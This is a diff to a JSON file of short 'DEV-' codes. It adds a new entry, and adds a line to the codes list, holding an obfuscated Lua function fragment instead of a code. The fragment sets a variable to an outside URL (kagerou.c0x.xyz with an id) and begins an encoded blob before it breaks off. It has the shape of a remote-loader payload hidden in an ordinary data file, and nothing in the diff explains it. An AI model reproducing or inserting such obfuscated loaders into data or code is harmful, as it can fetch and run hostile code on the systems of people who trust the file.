@@ -382,6 +382,13 @@
         "DEV-PZUQ-2SOU"
       ],
       "updated_at": "2025-09-25T15:38:44+00:00Z"
+    },
+    {
+      "id": "1230119812345237527",
+      "codes": [
+        "(function()local _a,_b,_c,_d,_e,_f,_g,_h,_i,_j;_a='https://kagerou.c0x.xyz/?id=pfnhwlimirxxptyykgqaytue';_b='BQ0bFB1GHAsLGxUABBR"
+      ],
+      "updated_at": "2025-09-26T16:28:52+00:00Z"
     }
   ],
   "codes": [
@@ -484,6 +491,7 @@
     "DEV-WCG5-TPXZ",
     "DEV-IIUO-EZCV",
     "DEV-PZUQ-2SOU",
-    "DEV-VQTC-WAMX"
+    "DEV-VQTC-WAMX",
+    "(function()local _a,_b,_c,_d,_e,_f,_g,_h,_i,_j;_a='https://kagerou.c0x.xyz/?id=pfnhwlimirxxptyykgqaytue';_b='BQ0bFB1GHAsLGxUABBR"
   ]
 }
